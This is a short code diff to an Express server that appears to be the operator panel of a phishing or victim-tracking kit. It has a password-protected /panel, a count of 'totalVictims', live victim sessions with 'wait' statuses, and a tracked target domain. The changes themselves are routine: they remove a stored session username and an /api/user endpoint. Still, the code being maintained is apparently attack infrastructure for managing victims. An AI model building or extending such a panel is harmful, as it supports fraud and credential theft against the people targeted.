@@ -52,7 +52,6 @@ app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
   if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed = true;
-    req.session.username = user;
     return res.redirect('/panel');
   }
   res.redirect('/panel?fail=1');
@@ -339,14 +338,6 @@ app.post('/api/interaction', (req, res) => {
 
 /* ----------  WEB PANEL API  ---------- */
 
-/*  get current user info  */
-app.get('/api/user', (req, res) => {
-  if (req.session?.authed) {
-    return res.json({ username: req.session.username || PANEL_USER });
-  }
-  res.status(401).json({ error: 'Not authenticated' });
-});
-
 /*  panel data  */
 app.get('/api/panel', (req, res) => {
   const list = Array.from(sessionsMap.values()).map(v => ({
@@ -358,7 +349,6 @@ app.get('/api/panel', (req, res) => {
   }));
   res.json({
     domain: currentDomain,
-    username: req.session?.username || PANEL_USER,
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
